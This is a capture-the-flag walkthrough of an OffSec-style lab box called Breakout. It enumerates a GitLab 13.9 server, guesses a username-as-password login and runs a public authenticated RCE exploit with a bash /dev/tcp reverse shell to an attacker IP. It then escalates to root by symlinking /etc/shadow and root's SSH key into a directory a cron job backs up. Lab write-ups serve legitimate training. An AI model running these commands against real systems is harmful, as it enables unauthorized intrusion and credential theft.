@@ -1,0 +1,203 @@
+																			                        Breakout Walkthrough
+													
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.214.182
+export IP=192.168.214.182
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp open  ssh
+80/tcp open  http
+
+nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-robots.txt: 54 disallowed entries (15 shown)
+| / /autocomplete/users /autocomplete/projects /search 
+| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
+|_/*/new /*/edit /*/raw
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://192.168.204.182/users/sign_in
+Service Info: OS: Linux
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+ Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+| http-enum: 
+|   /robots.txt: Robots file
+|   /help/: Potentially interesting folder
+|   /public/: Potentially interesting folder
+|   /root/: Potentially interesting folder
+|   /search/: Potentially interesting folder
+|_  /webmaster/: Potentially interesting folder
+
+nikto --url $IP
+
+Port 80 Enumeration
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
+.well-known/openid-configuration
+explore
+help
+public
+robots.txt
+root
+search
+webmaster
+
+# Following the help page, let's see if you find out which version is being used. On top right, there is a help drop down menu, select What's New.
+
+version 13.9
+
+searchsploit gitlab
+GitLab Community Edition (CE) 13.10.3 - User Enumeration                                   | ruby/webapps/49821.sh
+https://www.exploit-db.com/exploits/49821
+
+bash 49821.sh --url http://$IP --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | grep -v "LOOP\|302"
+
+200
+[+] The username webmaster exists!
+200
+[+] The username root exists!
+200
+[+] The username michelle exists!
+200
+[+] The username public exists!
+
+# So, we have 4 possible usernames, let's try some common credentials for them, usually people tend to use the same password as their username.
+
+webmaster / webmaster
+root / root
+michelle / michelle               # Bingo
+
+# Since we have credentials, and we know that we are using version 13.9.1,  let's search again for an authenticated exploit.
+
+searchsploit gitlab
+Gitlab 13.10.2 - Remote Code Execution (Authenticated)                                     | ruby/webapps/49951.py
+GitLab 13.10.2 - Remote Code Execution (RCE) (Unauthenticated)                      | ruby/webapps/50532.txt
+Gitlab 13.9.3 - Remote Code Execution (Authenticated)                                      | ruby/webapps/49944.py
+
+searchsploit -m ruby/webapps/49944.py
+https://www.exploit-db.com/exploits/49944
+
+python 49944.py -u michelle -p michelle -c 'bash -c "bash -i >/dev/tcp/192.168.45.5/4444 0>&1 2>&1"' -t http://$IP
+
+Please tell me who you are.
+Run
+
+  git config --global user.email "you@example.com"
+  git config --global user.name "Your Name"
+
+# Before running the exploit we need to set our git configuration, the user email is obtained from the Edit profile page.
+
+git config --global user.email “michelle@breakout.offsec”
+git config --global user.name "michelle"
+git config --global user.password "michelle"
+
+python 49944.py -u michelle -p michelle -c 'bash -c "bash -i >/dev/tcp/192.168.45.5/4444 0>&1 2>&1"' -t http://$IP
+Username for 'http://192.168.214.182': michelle
+Password for 'http://michelle@192.168.214.182': michelle
+
+nc -lvnp 4444                                                    # Got shell
+
+cd /var/opt/gitlab/backups
+cat mykey
+# Decode the private key in base64 and notice that it's assigned to the user coaran
+
+chmod 600 id_rsa
+ssh -i id_rsa coaran@$IP
+
+cat local.txt                                                     # Flag: d6627867a00b1b788467e59ad79b02d2
+
+Privilege escalation
+
+# Run linpeas
+
+Breakout via mounts
+ release_agent breakout 1........ Yes
+ 
+ 
+# Run pspy64 
+
+/bin/sh -c bash /opt/backups/backup.sh 
+
+cd /opt/backups
+cat backup.sh
+/usr/bin/zip -r /opt/backups/log_backup.zip /srv/gitlab/logs/*
+
+cd /srv/gitlab/logs/
+
+# Unfortunately we don't have write access in this directory. Remember that when we ran linpeas, we saw that we have mounts. Let's try and see if we have any mounting options for /srv/gitlab/logs/*.
+
+mount
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+udev on /dev type devtmpfs (rw,nosuid,noexec,relatime,size=1970108k,nr_inodes=492527,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=403056k,mode=755)
+/dev/sda2 on / type ext4 (rw,relatime)
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+
+# Seems that we don't have anything mounted that we could use. Let's see mounts for user git, the one we got access when we managed to get the shell.
+
+/dev/sda2 on /var/opt/gitlab type ext4 (rw,relatime)
+/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
+
+# Check if /srv/gitlab/logs has been mounted on any of these paths.
+
+coaran@breakout:/srv/gitlab/logs$ ls -lsa
+4 drwx------  2 lxd  root             4096 Apr 12 07:01 gitaly
+4 drwx------  2 lxd  root             4096 Apr 12 06:34 gitlab-exporter
+4 drwx------  2 lxd  root             4096 Apr 12 08:01 gitlab-rails
+4 drwx------  2 lxd  root             4096 Mar  3  2022 gitlab-shell
+4 drwx------  2 lxd  root             4096 Apr 12 06:34 gitlab-workhorse
+4 drwx------  2 lxd  root             4096 Apr 12 07:01 puma
+4 drwx------  2 lxd  root             4096 Apr 12 06:33 sidekiq
+
+
+git@breakout:/var/log/gitlab$ ls -lsa
+4 drwx------  2 git               root       4096 Apr 12 07:01 gitaly
+4 drwx------  2 git               root       4096 Apr 12 06:34 gitlab-exporter
+4 drwx------  2 git               root       4096 Apr 12 08:01 gitlab-rails
+4 drwx------  2 git               root       4096 Mar  3  2022 gitlab-shell
+4 drwx------  2 git               root       4096 Apr 12 06:34 gitlab-workhorse
+4 drwx------  2 git               root       4096 Apr 12 07:01 puma
+4 drwx------  2 git               root       4096 Apr 12 06:33 sidekiq
+
+
+# We see that /srv/gitlab/logs is mounted as /var/log/gitlab. While logged in as git, we see that we have permissions of multiple directories. Let's chose one on them.
+
+cd /var/log/gitlab/sidekiq
+
+# Create a symbolic link to sensitive files that will give you access (/etc/shadow, /root/.ssh/id_rsa)
+ln -s /etc/shadow shadow
+ln -s /root/.ssh/id_rsa root_id_rsa
+
+# Switch to coaran user and wait one minute for the cron job to execute the backup in the folder /opt/backups/log_backup.zip
+
+cd /opt/backups/
+unzip log_backup.zip -d /tmp/
+inflating: /tmp/srv/gitlab/logs/sidekiq/root_id_rsa  
+inflating: /tmp/srv/gitlab/logs/sidekiq/shadow 
+
+cat  /tmp/srv/gitlab/logs/sidekiq/shadow 
+root:$6$lmpc5MaDbr.aQ.Rx$Xbdo/gDckcUabHmBt72pfvsOKf4LjPOXWE5A9t/eZ9GH9KDbjK8.Oa/DgJN/mBJcTL3/vfWk7JCN3a3vLJRUm.:19055:0:99999:7:::
+coaran:$6$W6s35KUapyccQhAo$Wgi4Yz9/w04qNGyEU/9PVsT.CNofq8BYhHUeOUbIBzL0av0eD7pTo.dH9xEiQ9.L/a5Stbuuki48APmNVNF4e1:19055:0:99999:7:::
+
+# Since we can't crack any of the hashes :(, let's try to use the SSH private key to log in
+
+cat /tmp/srv/gitlab/logs/sidekiq/root_id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn .... NhAAAAAwE MEBQ==
+-----END OPENSSH PRIVATE KEY-----
+
+chmod 600 root_id_rsa
+ssh -i root_id_rsa root@$IP
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/proof.txt                                                                      #Flag: 4301c3c935687af210fb06fa50a1cd01
